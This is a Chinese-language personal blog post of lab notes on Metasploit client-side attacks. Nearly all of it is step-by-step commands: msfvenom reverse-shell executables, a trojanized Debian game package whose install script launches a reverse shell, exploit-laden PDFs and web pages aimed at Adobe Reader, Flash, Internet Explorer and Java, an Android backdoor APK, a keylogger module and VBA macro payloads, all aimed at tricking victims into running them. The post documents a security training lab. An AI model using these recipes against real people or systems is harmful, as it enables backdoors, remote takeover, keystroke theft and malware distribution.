<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/default.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Tomas">
  <meta name="keywords" content="">
  <title>Kali Linux笔记(一百零五)：MSF--客户端渗透 - Tomas&#39;Blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link  rel="stylesheet" href="/lib/prettify/tomorrow.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Tomas'Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期一, 三月 2日 2020, 3:26 下午
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    2.1k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      9 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
              <p
                class="note note-warning">本文最后更新于：星期二, 三月 3日 2020, 3:00 下午</p>
            
            <div class="markdown-body">
              <hr>
<h4 id="1-Msf–客户端渗透"><a href="#1-Msf–客户端渗透" class="headerlink" title="1. Msf–客户端渗透"></a>1. Msf–客户端渗透</h4><ul>
<li>在无法突破网络边界的情况下转而攻击客户端<ul>
<li>社会工程学攻击</li>
<li>进而渗透线上业务网络</li>
</ul>
</li>
<li>含有漏洞利用代码的WEB站点<ul>
<li>利用客户端漏洞</li>
</ul>
</li>
<li>含有漏洞利用代码的DOC、PDF等文档</li>
<li>诱骗被害者执行Payload</li>
</ul>
<h4 id="2-诱骗被害者执行Payload（Windows）"><a href="#2-诱骗被害者执行Payload（Windows）" class="headerlink" title="2. 诱骗被害者执行Payload（Windows）"></a>2. 诱骗被害者执行Payload（Windows）</h4><ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom --payload-options -p windows/shell/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：cp /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
<li><strong><code>🔺命令：set payload windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP/1.exe，下载并保存" target="_blank" rel="noopener">http://Kali的IP/1.exe，下载并保存</a></li>
<li>在Kali服务器端准备好后，执行1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否已经获得shell</li>
</ul>
</li>
</ul>
<h4 id="3-诱骗被害者执行Payload（Linux-Deb包）"><a href="#3-诱骗被害者执行Payload（Linux-Deb包）" class="headerlink" title="3. 诱骗被害者执行Payload（Linux Deb包）"></a>3. 诱骗被害者执行Payload（Linux Deb包）</h4><ul>
<li>Bodhi<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>依赖文件：/var/cache/apt/archives/</li>
<li><strong><code>🔺命令：apt-get --download-only install freesweep_0.90-1_i386.deb</code></strong></li>
<li><strong><code>🔺命令：cp freesweep_0.90-1_i386.deb /root/Desktop</code></strong></li>
<li><strong><code>🔺命令：cd /root/Desktop</code></strong></li>
<li><strong><code>🔺命令：dpkg -x freesweep_0.90-1_i386.deb free</code></strong></li>
<li><strong><code>🔺命令：mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></strong></li>
<li><strong><code>🔺命令：vi control</code></strong><ul>
<li>Package:freesweep</li>
<li>Version:0.90-1</li>
<li>Section:Games and Amusement</li>
<li>Priority:optional</li>
<li>Architecture:i386</li>
<li>Maintainer:Ubuntu MOTU Developers(<a href="mailto:ubuntu-motu@lists.ubuntu.com" target="_blank" rel="noopener">ubuntu-motu@lists.ubuntu.com</a>)</li>
<li>Description:a text-based minesweeper</li>
<li>Freesweep is an implementation of the popular minesweeper game,where one tries to find all the mines without igniting any,based on hints given by the computer.Unlike most implementations of this game,Freesweep works in any visual text display in Linux console,in an xterm,and in most text-based terminals currently in use.</li>
</ul>
</li>
<li><strong><code>🔺命令：vi postinst</code></strong> <ul>
<li>#!/bin/sh </li>
<li>sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/ freesweep_scores &amp; /usr/games/freesweep &amp;</li>
</ul>
</li>
<li><strong><code>🔺命令：chmod +x postinst</code></strong> </li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></strong></li>
<li><strong><code>🔺命令：chmod 755 postinst</code></strong></li>
<li><strong><code>🔺命令：dpkg-deb --build /root/free</code></strong></li>
<li><strong><code>🔺命令：cp /root</code></strong></li>
<li><strong><code>🔺命令：cp free.deb /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
<li><strong><code>🔺命令：set payload linux/x86/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Bodhi<ul>
<li>浏览器访问<a href="http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）" target="_blank" rel="noopener">http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）</a></li>
<li><strong><code>🔺命令：sudp dpkg -i free.deb</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否已经获得shell</li>
</ul>
</li>
<li>▲ 2020.03.01 freesweep程序为1.0.1-1，amd64架构，暂无法找到0.90-1，i386架构</li>
<li>▲ 2020.03.01 无法拿到shell，但能看到分步(stage)发送shell的代码，估计权限问题</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=2943VKOzBws-fXPZvYeClqNi9jnNbtOmUSEM80J3jKa8p6ZZIclAArUm-tmAzsIgjYpsPMTrloK1RFM9c4A_LYB1s8bw0LtYDSIm15uLQznoMU_9Q0pMiJAURx_6OwbUyw&file_name=/freeswap-control.PNG" srcset="/img/loading.gif" alt="freesweep-control"></p>
<h4 id="4-利用Acrobat-Reader漏洞执行payload"><a href="#4-利用Acrobat-Reader漏洞执行payload" class="headerlink" title="4. 利用Acrobat Reader漏洞执行payload"></a>4. 利用Acrobat Reader漏洞执行payload</h4><ul>
<li>构造PDF文件：<strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装Acrobat Reader8.1.2</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong>（生成一个PDF文件）</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /mnt/hgfs/share/</code></strong>（查看是否被查杀）</li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /var/www/html</code></strong></li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP/msf.pdf（是否停止工作）" target="_blank" rel="noopener">http://Kali的IP/msf.pdf（是否停止工作）</a></li>
</ul>
</li>
<li>Kali<ul>
<li>压缩为ZIP文件</li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.zip /mnt/hgfs/share/</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>解压msf.zip为msf.pdf，双击打开msf.pdf</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>构造恶意网站：<strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装Acrobat Reader8.1.2（小于8.1.3的缓冲区溢出漏洞）</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong>（如果不设置，则回生成一个随机字符串）</li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：use priv</code></strong>（提权）</li>
<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong></li>
<li><strong><code>🔺命令：tailf</code></strong> 查看键盘记录器</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>随机敲击键盘或运行命令</li>
</ul>
</li>
<li>Kali<ul>
<li>查看键盘记录器是否记录</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.02 通过构造恶意网站来拿到shell的模块暂无法成功拿到shell</li>
<li>Meterpreter <ul>
<li><strong><code>🔺命令：use priv</code></strong></li>
<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="5-利用Flash插件漏洞执行payload（对Flash版本要求高）"><a href="#5-利用Flash插件漏洞执行payload（对Flash版本要求高）" class="headerlink" title="5. 利用Flash插件漏洞执行payload（对Flash版本要求高）"></a>5. 利用Flash插件漏洞执行payload（对Flash版本要求高）</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
<li>Window 7（带Flash）<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7（带Flash）<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
<li>Window 7（带Flash）<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7（带Flash）<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use auxiliary/server/</code></strong>browser_autopwn2（挑选质量较好的payload的集合）<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use auxiliary/server/browser_autopwn2</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>Android手机<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.02 很难下载到对应Flash插件版本</li>
</ul>
<h4 id="6-利用IE浏览器漏洞执行payload"><a href="#6-利用IE浏览器漏洞执行payload" class="headerlink" title="6. 利用IE浏览器漏洞执行payload"></a>6. 利用IE浏览器漏洞执行payload</h4><ul>
<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：sysinfo</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="7-利用JRE漏洞执行payload"><a href="#7-利用JRE漏洞执行payload" class="headerlink" title="7. 利用JRE漏洞执行payload"></a>7. 利用JRE漏洞执行payload</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装jre-7u10-windows-i586</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装jre-7u10-windows-i586</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-生成Android后门程序"><a href="#8-生成Android后门程序" class="headerlink" title="8. 生成Android后门程序"></a>8. 生成Android后门程序</h4><ul>
<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：generate -f apk -p android -t raw</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload android/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Android<ul>
<li>拷贝a.apk到Android手机</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到了shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：ps</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="9-VBScript感染方式"><a href="#9-VBScript感染方式" class="headerlink" title="9. VBScript感染方式"></a>9. VBScript感染方式</h4><ul>
<li>利用宏感染word、excel文档</li>
<li>绕过某些基于文件类型检查的安全机制</li>
<li>生成vbscript脚本：<strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/ meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe</code></strong></li>
<li>Office 2007 +<ul>
<li>视图–宏–创建</li>
<li>Payload第一部分VBA代码黏入宏创建中</li>
<li>Payload第二部分十六进制代码黏入word文档正文</li>
<li>双击打开则促发攻击</li>
</ul>
</li>
<li>Msf启动侦听<ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
</ul>
</li>
</ul>

            </div>
            <hr>
            <div>
              <p>
                
                  <span>
                <i class="iconfont icon-inbox"></i>
                    
                      <a class="hover-with-bg" href="/categories/Kali/">Kali</a>
                      &nbsp;
                    
                  </span>&nbsp;&nbsp;
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8/">安全</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="/2020/03/02/IPS%E7%AC%94%E8%AE%B0-1%EF%BC%9AIPS%E5%9F%BA%E7%A1%80/">
                        <i class="fa fa-chevron-left"></i>
                        <span class="hidden-mobile">IPS笔记-1：IPS基础</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%9B%9B)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--%E7%BB%93%E5%90%88%E5%A4%96%E9%83%A8%E5%BA%94%E7%94%A8/">
                        <span class="hidden-mobile">Kali Linux笔记(一百零四)：MSF模块--结合外部应用</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-md">
    <div class="container custom post-content mx-auto">
      <h3>你好，Tomas，生命仍在继续......</h3>
    </div>
  </div>


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
